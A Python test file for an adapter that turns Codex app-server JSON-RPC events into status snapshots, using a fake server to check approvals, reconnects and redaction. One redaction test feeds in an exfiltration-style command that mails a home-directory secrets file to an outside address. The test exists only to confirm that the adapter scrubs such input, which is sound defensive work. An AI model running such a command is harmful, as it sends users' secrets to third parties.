"""P3.1 离线单测：锁定版 codex app-server adapter（bridge/sources/codex.py）。

策略（任务要求：离线为主，不依赖网络/真实 codex）：

- 用 docs/proto-samples/ 的真实脱敏样本构造一个假 app-server（subprocess，
  stdio 按行 JSON-RPC，帧格式与 codex 0.152.0 一致），覆盖：
  映射正确性（审批→needs_you、resolved→恢复、tokenUsage→context、
  rateLimits→usage）、断连→stale、重连→connected 翻转、能力缺失→降级。
- 审批只读红线：假 app-server 记录客户端发来的任何应答帧；
  断言 adapter 对 server→client 审批请求从未回应。
- mapper 纯单测：plan 归一化、waitingOnUserInput 合成/替换、稀疏额度合并、
  interrupted→cancelled、未知方法忽略、摘要脱敏。
"""

from __future__ import annotations

import json
import os
import sys
import textwrap

import pytest

from bridge import __main__ as bridge_main
from bridge.sources import codex as codex_mod
from conftest import REPO_ROOT, assert_invariants

SAMPLES = REPO_ROOT / "docs" / "proto-samples"

# ---------------------------------------------------------------------------
# 假 app-server：stdio JSON-RPC，行为由 conf.json 的 phases 驱动。
# argv: conf_path counter_path replies_path（replies 记录客户端的应答帧，审批红线证据）
# ---------------------------------------------------------------------------

FAKE_SERVER = textwrap.dedent(
    """
    import json, os, sys, threading, time

    lock = threading.Lock()

    def send(obj):
        with lock:
            sys.stdout.write(json.dumps(obj, separators=(",", ":"), ensure_ascii=False) + "\\n")
            sys.stdout.flush()

    def respond(mid, result=None, error=None):
        msg = {"jsonrpc": "2.0", "id": mid}
        if error is not None:
            msg["error"] = error
        else:
            msg["result"] = result
        send(msg)

    RATE_LIMITS_READ = {
        "rateLimits": {
            "limitId": "codex",
            "primary": {"usedPercent": 24, "windowDurationMins": 300,
                        "resetsAt": 1789030193},
            "secondary": {"usedPercent": 22, "windowDurationMins": 10080,
                          "resetsAt": 1789446614},
            "planType": "plus",
        },
    }

    def main():
        conf_path, counter_path, replies_path = sys.argv[1:4]
        with open(conf_path, "r", encoding="utf-8") as fh:
            conf = json.load(fh)
        try:
            with open(counter_path, "r", encoding="utf-8") as fh:
                idx = int(fh.read().strip() or "0")
        except OSError:
            idx = 0
        with open(counter_path, "w", encoding="utf-8") as fh:
            fh.write(str(idx + 1))
        phase = conf["phases"][min(idx, len(conf["phases"]) - 1)]

        def schedule(steps):
            def run():
                t0 = time.monotonic()
                for step in steps:
                    wait = step.get("delay", 0.05) - (time.monotonic() - t0)
                    if wait > 0:
                        time.sleep(wait)
                    if step.get("kind") == "crash":
                        os._exit(101)  # 模拟 app-server 进程暴毙
                    send(step["raw"])
            threading.Thread(target=run, daemon=True).start()

        for line in sys.stdin:
            line = line.strip()
            if not line:
                continue
            try:
                msg = json.loads(line)
            except ValueError:
                continue
            if "method" in msg:
                meth, mid = msg.get("method"), msg.get("id")
                if meth == "initialize":
                    respond(mid, {"userAgent": "codex-fake/0.152.0 (test; fake app-server)",
                                  "codexHome": "~/.codex", "platformFamily": "unix",
                                  "platformOs": "macos"})
                elif meth == "account/rateLimits/read":
                    if phase.get("rate_limits", "ok") == "ok":
                        respond(mid, RATE_LIMITS_READ)
                    else:
                        respond(mid, None, {"code": -32601, "message": "Method not found"})
                elif meth == "thread/start":
                    if phase.get("thread_start", "ok") == "error":
                        respond(mid, None, {"code": -32601, "message": "Method not found"})
                        continue
                    respond(mid, {"thread": {"id": phase["thread_id"], "cwd": os.getcwd(),
                                             "ephemeral": True},
                                  "model": "gpt-5.6-sol",
                                  "approvalPolicy": "never",
                                  "sandbox": {"type": "readOnly", "networkAccess": False}})
                    schedule(phase["steps"])
                elif meth == "turn/start":
                    respond(mid, {"turn": {"id": phase["turn_id"], "status": "inProgress"}})
                elif meth == "turn/interrupt":
                    respond(mid, {})
                else:
                    respond(mid, None, {"code": -32601, "message": "Method not found"})
            elif "result" in msg or "error" in msg:
                # 客户端对我们发的请求回了话；审批请求（id=0）绝不允许出现这种帧。
                with open(replies_path, "a", encoding="utf-8") as fh:
                    fh.write(line + "\\n")

    main()
    """
)


@pytest.fixture(scope="module")
def fake_server_path(tmp_path_factory):
    path = tmp_path_factory.mktemp("fake") / "fake_appserver.py"
    path.write_text(FAKE_SERVER, encoding="utf-8")
    return path


def write_conf(tmp_path, phases):
    conf = tmp_path / "conf.json"
    conf.write_text(json.dumps({"phases": phases}), encoding="utf-8")
    counter = tmp_path / "counter.txt"
    counter.write_text("0", encoding="utf-8")
    replies = tmp_path / "replies.jsonl"
    return conf, counter, replies


def make_adapter(fake_server_path, tmp_path, phases, **kw):
    conf, counter, replies = write_conf(tmp_path, phases)
    defaults = dict(
        server_argv=[sys.executable, str(fake_server_path), str(conf), str(counter),
                     str(replies)],
        backoff=(0.0,),      # 测试用 0 退避，保持快速
        jitter=0.0,
        connect_timeout=5.0,
        start_timeout=5.0,
        turn_timeout=15.0,
        interrupt_grace=3.0,
        epoch="codex-test-001",
    )
    defaults.update(kw)
    adapter = codex_mod.CodexAdapter(prompt="只回复 ok", **defaults)
    return adapter, replies


# ---------------------------------------------------------------------------
# 场景步骤：全部取自 docs/proto-samples/ 的真实脱敏样本，仅统一 thread/turn id。
# ---------------------------------------------------------------------------

def _load(relpath):
    return json.loads((SAMPLES / relpath).read_text(encoding="utf-8"))


def _note(method, params, i):
    return {"kind": "notification", "delay": 0.05,
            "raw": {"jsonrpc": "2.0", "method": method, "params": params,
                    "emittedAtMs": 1789015000000 + i * 250}}


class Script:
    def __init__(self):
        self.steps = []
        self._i = 0

    def add(self, method, params):
        self.steps.append(_note(method, params, self._i))
        self._i += 1
        return self

    def raw(self, step):
        self.steps.append(step)
        return self


def happy_steps(thread_id, turn_id):
    s = Script()
    e = _load("events/thread.started.json")
    e["params"]["thread"]["id"] = thread_id
    e["params"]["thread"]["cwd"] = "/tmp/codex-fake-cwd"
    s.add("thread/started", e["params"])

    e = _load("events/thread.status.changed.active.json")
    e["params"]["threadId"] = thread_id
    s.add("thread/status/changed", e["params"])

    e = _load("events/turn.started.json")
    e["params"]["threadId"] = thread_id
    e["params"]["turn"]["id"] = turn_id
    s.add("turn/started", e["params"])

    # commandExecution item/started（0.152.0 schema 形状；审批样本同款命令）
    s.add("item/started", {
        "item": {"type": "commandExecution", "id": "exec-1",
                 "command": "/bin/zsh -lc 'uname -a'"},
        "threadId": thread_id, "turnId": turn_id, "startedAtMs": 1789015000600,
    })

    approval = _load("requests/server.item.commandExecution.requestApproval.unanswered.json")
    approval["params"]["threadId"] = thread_id
    approval["params"]["turnId"] = turn_id
    s.raw({"kind": "server_request", "delay": 0.1, "raw": approval})

    e = _load("events/thread.status.changed.waitingOnApproval.json")
    e["params"]["threadId"] = thread_id
    s.add("thread/status/changed", e["params"])

    e = _load("events/serverRequest.resolved.json")
    e["params"] = {"threadId": thread_id, "requestId": 0}
    s.add("serverRequest/resolved", e["params"])

    e = _load("events/item.completed.agentMessage.json")
    e["params"]["threadId"] = thread_id
    e["params"]["turnId"] = turn_id
    s.add("item/completed", e["params"])

    e = _load("events/thread.tokenUsage.updated.json")
    e["params"]["threadId"] = thread_id
    e["params"]["turnId"] = turn_id
    s.add("thread/tokenUsage/updated", e["params"])

    e = _load("events/account.rateLimits.updated.json")
    s.add("account/rateLimits/updated", e["params"])

    e = _load("events/turn.completed.json")
    e["params"]["threadId"] = thread_id
    e["params"]["turn"]["id"] = turn_id
    s.add("turn/completed", e["params"])
    return s.steps


def phase(thread_id, turn_id, steps, rate_limits="ok", thread_start="ok"):
    return {"rate_limits": rate_limits, "thread_start": thread_start,
            "thread_id": thread_id, "turn_id": turn_id, "steps": steps}


# ---------------------------------------------------------------------------
# adapter × 假 app-server 集成测试
# ---------------------------------------------------------------------------

def flow_of(snapshots):
    return [(s["seq"], s["threads"][0]["state"] if s["threads"] else None)
            for s in snapshots]


def test_happy_path_mapping(validator, fake_server_path, tmp_path):
    """完整受控 turn：真实样本事件 → 状态流转 → 快照序列（schema 全过）。"""
    adapter, replies = make_adapter(
        fake_server_path, tmp_path,
        [phase("th-life", "turn-life", happy_steps("th-life", "turn-life"))])
    result = adapter.run()

    assert result.exit_code == 0, result.report
    snaps = result.snapshots
    assert [s["seq"] for s in snaps] == list(range(1, len(snaps) + 1))

    # 真实 ephemeral turn 的完整状态流转（working → needs_you → … → done）
    assert flow_of(snaps) == [
        (1, None),      # source_reconnected
        (2, None),      # 启动 account/rateLimits/read → usage
        (3, "idle"),    # thread/started
        (4, "working"),  # thread/status/changed active
        (5, "working"),  # turn/started
        (6, "working"),  # item/started commandExecution
        (7, "needs_you"),  # 审批请求（server→client，只接收）
        (8, "needs_you"),  # waitingOnApproval 确认（不改变等待）
        (9, "working"),  # serverRequest/resolved → 恢复
        (10, "working"),  # item/completed
        (11, "working"),  # tokenUsage → context
        (12, "working"),  # rateLimits/updated → usage 刷新
        (13, "done"),    # turn/completed
    ]

    for snap in snaps:
        errors = list(validator.iter_errors(snap))
        assert not errors, f"seq={snap['seq']}: {errors[0].message}"
        assert_invariants(snap)
        assert snap["source"]["kind"] == "codex_bridge_owned"
        assert snap["source"]["connected"] is True and snap["source"]["stale"] is False

    # 审批 → needs_you（pending 计数 + 脱敏命令摘要）
    need = snaps[6]
    attention = need["threads"][0]["attention"]
    assert attention["pending_count"] == 1
    assert "uname -a" in attention["summary"]

    # resolved → 恢复 working，等待清空
    recovered = snaps[8]
    assert recovered["threads"][0]["state"] == "working"
    assert recovered["threads"][0]["attention"] is None
    assert recovered["threads"][0]["waiting_ms"] == 0

    # tokenUsage → context（totalTokens 含系统开销，仍按现状呈现）
    context = snaps[10]["threads"][0]["context"]
    assert context == {"used_tokens": 23017, "capacity_tokens": 258400,
                       "used_percent": 8.9}

    # rateLimits → usage 双窗口（启动 read 24%/300min + 22%/10080min；updated 29%）
    assert [(w["used_percent"], w["duration_mins"]) for w in snaps[1]["usage"]["windows"]] \
        == [(24.0, 300), (22.0, 10080)]
    assert snaps[11]["usage"]["windows"][0]["used_percent"] == 29.0
    assert snaps[-1]["usage"]["available"] is True

    # 终态 done
    last_thread = snaps[-1]["threads"][0]
    assert last_thread["state"] == "done"
    assert last_thread["end_reason"] == "completed"
    assert last_thread["turn_id"] == "turn-life"
    assert last_thread["project"] == "codex-fake-cwd"

    # 安全红线：审批请求从未被回应
    assert not replies.exists()

    # 能力检测结果进了报告
    caps = result.report["capabilities"]
    assert caps["initialize"] is True
    assert caps["cli_version"] == "0.152.0"
    assert caps["rate_limits_read"] is True
    assert caps["thread_start_executed"] is True
    assert caps["turn_start_executed"] is True
    assert caps["declared"]["thread/start"] is True
    # 审批族来自 v1 schema 的 ServerRequest 桶（方法存档没有该桶）
    assert caps["declared"]["item/commandExecution/requestApproval"] is True
    assert result.report["exit_reason"] == "turn_completed"
    # 原始日志已脱敏且记录了双向 IO
    assert result.raw_log, "raw (redacted) IO log must be kept"
    assert any(e["dir"] == "in" and e["payload"].get("method") == "turn/completed"
               for e in result.raw_log)
    raw_text = json.dumps(result.raw_log, ensure_ascii=False)
    assert os.path.expanduser("~") not in raw_text


def test_disconnect_reconnect_stale_semantics(validator, fake_server_path, tmp_path):
    """app-server 进程暴毙 → source_disconnected（stale，任务不转 idle）→
    指数退避重启 → source_reconnected（connected 翻转）。"""
    crash_steps = happy_steps("th-crash", "turn-crash")[:3]  # thread/状态/turn 开始
    crash_steps.append({"kind": "crash", "delay": 0.25})
    adapter, replies = make_adapter(
        fake_server_path, tmp_path,
        [phase("th-crash", "turn-crash", crash_steps),
         phase("th-after", "turn-after", happy_steps("th-after", "turn-after"))],
        backoff=(0.0,))  # 第二次（也是最后一次）尝试
    result = adapter.run()

    assert result.exit_code == 0, result.report
    snaps = result.snapshots
    for snap in snaps:
        errors = list(validator.iter_errors(snap))
        assert not errors, f"seq={snap['seq']}: {errors[0].message}"
        assert_invariants(snap)

    disconnected = [s for s in snaps if not s["source"]["connected"]]
    assert disconnected, "process exit must produce a stale snapshot"
    for snap in disconnected:
        assert snap["source"]["stale"] is True
        # 上游断连不把任务改成 IDLE、不伪造 DONE（INTERFACES §3）
        rec = next(t for t in snap["threads"] if t["id"] == "th-crash")
        assert rec["state"] == "working"
        assert rec["end_reason"] is None

    last_disc_seq = disconnected[-1]["seq"]
    reconnected = next(s for s in snaps if s["seq"] > last_disc_seq)
    assert reconnected["source"]["connected"] is True
    assert reconnected["source"]["stale"] is False

    last = snaps[-1]
    old = next(t for t in last["threads"] if t["id"] == "th-crash")
    new = next(t for t in last["threads"] if t["id"] == "th-after")
    assert old["state"] == "working" and old["end_reason"] is None  # 不复活、不伪造
    assert new["state"] == "done" and new["end_reason"] == "completed"
    assert not replies.exists()
    assert len(result.report["attempts"]) == 2


def test_rate_limits_missing_degrades_then_recovers(fake_server_path, tmp_path):
    """account/rateLimits/read 不可用 → rate_limits_unavailable（usage.available=false）；
    之后 updated 推送仍可恢复 usage。"""
    adapter, _ = make_adapter(
        fake_server_path, tmp_path,
        [phase("th-cap", "turn-cap", happy_steps("th-cap", "turn-cap"),
               rate_limits="error")])
    result = adapter.run()

    assert result.exit_code == 0, result.report
    snaps = result.snapshots
    usage = snaps[1]["usage"]
    assert usage["available"] is False
    assert usage["windows"] == []
    assert result.report["capabilities"]["rate_limits_read"] is False
    assert result.report["capabilities"]["rate_limits_error"]
    # updated 推送恢复
    assert snaps[-1]["usage"]["available"] is True
    assert len(snaps[-1]["usage"]["windows"]) == 2


def test_thread_start_capability_missing_exit_6(fake_server_path, tmp_path):
    """thread/start 方法缺失（-32601）→ 能力缺失路径，退出码 6。"""
    adapter, _ = make_adapter(
        fake_server_path, tmp_path,
        [phase("th-x", "turn-x", [], thread_start="error")])
    result = adapter.run()

    assert result.exit_code == codex_mod.EXIT_CAPABILITY_MISSING
    assert result.report["exit_reason"] == "capability_missing"
    assert "thread_start_executed" not in result.report["capabilities"]


def test_turn_timeout_interrupts_own_turn_only(fake_server_path, tmp_path):
    """turn 停滞：adapter 只 interrupt 自己的受控 turn；无终态时不伪造 DONE，
    退出码 5；审批红线不破。"""
    stalled = happy_steps("th-stall", "turn-stall")[:3]  # 只到 turn/started
    adapter, replies = make_adapter(
        fake_server_path, tmp_path,
        [phase("th-stall", "turn-stall", stalled)],
        backoff=(), turn_timeout=0.8, interrupt_grace=1.0)
    result = adapter.run()

    assert result.exit_code == codex_mod.EXIT_TURN_TIMEOUT
    assert result.report["exit_reason"] == "turn_timeout"
    last = result.snapshots[-1]["threads"][0]
    assert last["state"] == "working"  # 无可靠终态：保持 working，不伪造 done/error
    assert last["end_reason"] is None
    assert not replies.exists()  # turn/interrupt 之外没有应答任何 server 请求
    # interrupt 请求确实发出且落在自己的 thread/turn 上
    interrupt = [e for e in result.raw_log if e.get("method") == "turn/interrupt"]
    assert interrupt and interrupt[0]["payload"]["params"]["turnId"] == "turn-stall"


# ---------------------------------------------------------------------------
# mapper 纯单测（无子进程）
# ---------------------------------------------------------------------------

def test_mapper_plan_updated_normalizes_in_progress():
    m = codex_mod.CodexEventMapper()
    events = m.notification(
        "turn/plan/updated",
        {"threadId": "t", "turnId": "u",
         "plan": [{"step": "检查需求", "status": "completed"},
                  {"step": "实现界面", "status": "inProgress"},
                  {"step": "运行测试", "status": "pending"}]},
        at_ms=1)
    assert len(events) == 1
    event = events[0]
    assert event.type == "plan_updated"
    assert event.plan_steps == (("检查需求", "completed"), ("实现界面", "in_progress"),
                                ("运行测试", "pending"))
    assert event.plan_total == 3


def test_mapper_waiting_on_user_input_synthesis_replaced_by_real_request():
    # STATUS.md P1.1 遗留：waitingOnUserInput 合成归 P3.1 adapter
    m = codex_mod.CodexEventMapper()
    events = m.notification(
        "thread/status/changed",
        {"threadId": "t",
         "status": {"type": "active", "activeFlags": ["waitingOnUserInput"]}},
        at_ms=5)
    assert [e.type for e in events] == ["thread_status_changed", "approval_requested"]
    synthetic = events[1]
    assert synthetic.request_id < 0  # 合成 id 用负数，不与上游 id 空间冲突
    assert "用户输入" in synthetic.summary

    real = {"method": "item/tool/requestUserInput", "id": 7,
            "params": {"threadId": "t", "turnId": "u", "summary": "需要选择 A 或 B"}}
    events2 = m.server_request(real)
    assert [e.type for e in events2] == ["server_request_resolved", "approval_requested"]
    assert events2[0].request_id == synthetic.request_id  # 合成项被真实请求替换
    assert events2[1].request_id == 7


def test_mapper_waiting_flag_with_real_pending_no_double_count():
    m = codex_mod.CodexEventMapper()
    m.server_request({"method": "item/commandExecution/requestApproval", "id": 0,
                      "params": {"threadId": "t", "turnId": "u",
                                 "command": "uname -a"}})
    events = m.notification(
        "thread/status/changed",
        {"threadId": "t", "status": {"type": "active",
                                     "activeFlags": ["waitingOnApproval"]}},
        at_ms=2)
    # 已有真实 pending：waiting 标志只确认 needs_you，不再合成第二个 pending
    assert [e.type for e in events] == ["thread_status_changed"]


def test_mapper_turn_interrupted_maps_to_cancelled():
    m = codex_mod.CodexEventMapper()
    events = m.notification(
        "turn/completed",
        {"threadId": "t", "turn": {"id": "u", "status": "interrupted"}}, at_ms=1)
    assert len(events) == 1
    assert events[0].type == "turn_completed"
    assert events[0].status == "cancelled"  # 0.152.0 无 cancelled 终态，interrupted 对齐


def test_mapper_turn_failed_carries_scrubbed_error():
    m = codex_mod.CodexEventMapper()
    events = m.notification(
        "turn/completed",
        {"threadId": "t",
         "turn": {"id": "u", "status": "failed",
                  "error": {"message": "model gpt-6-astra requires a newer Codex"}}},
        at_ms=1)
    assert events[0].status == "failed"
    assert "gpt-6-astra" in events[0].summary


def test_mapper_unknown_method_ignored():
    m = codex_mod.CodexEventMapper()
    assert m.notification("item/agentMessage/delta",
                          {"threadId": "t", "delta": "ok"}, at_ms=1) == []
    assert m.notification("hook/started", {}, at_ms=2) == []
    assert m.notifications_seen["item/agentMessage/delta"] == 1


def test_mapper_sparse_rate_limits_merge_keeps_last_known():
    m = codex_mod.CodexEventMapper()
    first = m.notification(
        "account/rateLimits/updated",
        {"rateLimits": {"primary": {"usedPercent": 29, "windowDurationMins": 300,
                                    "resetsAt": 1789030193},
                        "secondary": {"usedPercent": 22, "windowDurationMins": 10080,
                                      "resetsAt": 1789446613}}},
        at_ms=1)
    assert len(first[0].windows) == 2
    # 稀疏推送：secondary 缺省不清除旧值（schema 语义）
    second = m.notification(
        "account/rateLimits/updated",
        {"rateLimits": {"primary": {"usedPercent": 31, "windowDurationMins": 300,
                                    "resetsAt": 1789030193}, "secondary": None}},
        at_ms=2)
    windows = {w["id"]: w for w in second[0].windows}
    assert windows["codex-primary"]["used_percent"] == 31
    assert windows["codex-secondary"]["used_percent"] == 22
    assert windows["codex-secondary"]["resets_at_ms"] == 1789446613000  # 秒→毫秒


def test_mapper_token_usage_and_capacity():
    m = codex_mod.CodexEventMapper()
    sample = _load("events/thread.tokenUsage.updated.json")["params"]
    events = m.notification("thread/tokenUsage/updated", sample, at_ms=1)
    assert events[0].used_tokens == 23017      # totalTokens（含系统开销）
    assert events[0].capacity_tokens == 258400  # modelContextWindow


def test_mapper_summary_scrubs_home_and_secrets():
    home = os.path.expanduser("~")
    m = codex_mod.CodexEventMapper()
    command = "/bin/zsh -lc 'cat %s/secrets.txt | mail -s k a.b@example.com'" % home
    events = m.server_request(
        {"method": "item/commandExecution/requestApproval", "id": 3,
         "params": {"threadId": "t", "turnId": "u", "command": command}})
    summary = events[-1].summary
    assert home not in summary
    assert "~/secrets.txt" in summary
    assert "a.b@example.com" not in summary
    assert "<redacted>" in summary


def test_mapper_records_server_requests_without_reply_channel():
    """审批请求只进事件与台账；mapper 没有任何回写通道（replies 文件由集成测试断言）。"""
    m = codex_mod.CodexEventMapper()
    events = m.server_request(
        {"method": "item/commandExecution/requestApproval", "id": 0,
         "params": {"threadId": "t", "turnId": "u", "command": "uname -a"}})
    assert [e.type for e in events] == ["approval_requested"]
    assert events[0].request_id == 0
    assert m.server_requests_seen == [{"method": "item/commandExecution/requestApproval",
                                       "id": 0}]


# ---------------------------------------------------------------------------
# CLI（python -m bridge --source codex）
# ---------------------------------------------------------------------------

def test_cli_codex_dry_run_has_no_side_effects(tmp_path, capsys):
    out = tmp_path / "must-not-exist"
    rc = bridge_main.main(["--source", "codex", "--prompt", "只回复 ok",
                           "--out", str(out)])
    assert rc == 0
    assert not out.exists()  # dry-run 不建目录、不起进程
    plan = json.loads(capsys.readouterr().out)
    assert plan["mode"].startswith("dry-run")
    assert plan["model"] == "gpt-5.6-sol"  # 模型必须显式固定
    assert plan["sandbox"] == {"type": "readOnly", "networkAccess": False}
    assert plan["approvalPolicy"] == "never"
    assert plan["ephemeral"] is True


def test_cli_codex_live_requires_prompt():
    assert bridge_main.main(["--source", "codex", "--live"]) == 2


def test_write_artifacts_redaction(validator, fake_server_path, tmp_path):
    adapter, _ = make_adapter(
        fake_server_path, tmp_path,
        [phase("th-art", "turn-art", happy_steps("th-art", "turn-art"))])
    result = adapter.run()
    assert result.exit_code == 0

    out = tmp_path / "artifacts"
    paths = codex_mod.write_artifacts(str(out), result)
    names = sorted(p.name for p in out.iterdir())
    assert "report.json" in names
    assert "events_raw_redacted.jsonl" in names
    assert "snapshot_0001.json" in names
    assert len([p for p in paths if "snapshot_" in os.path.basename(p)]) \
        == len(result.snapshots)

    report = json.loads((out / "report.json").read_text(encoding="utf-8"))
    assert report["task"] == "P3.1"
    assert report["source_kind"] == "codex_bridge_owned"
    assert report["prompt"].startswith("<content len=")  # 提示词正文不落盘
    assert report["snapshot_count"] == len(result.snapshots)

    home = os.path.expanduser("~")
    for path in out.iterdir():
        text = path.read_text(encoding="utf-8")
        assert home not in text, f"{path.name} leaks home path"
        assert "example.com" not in text
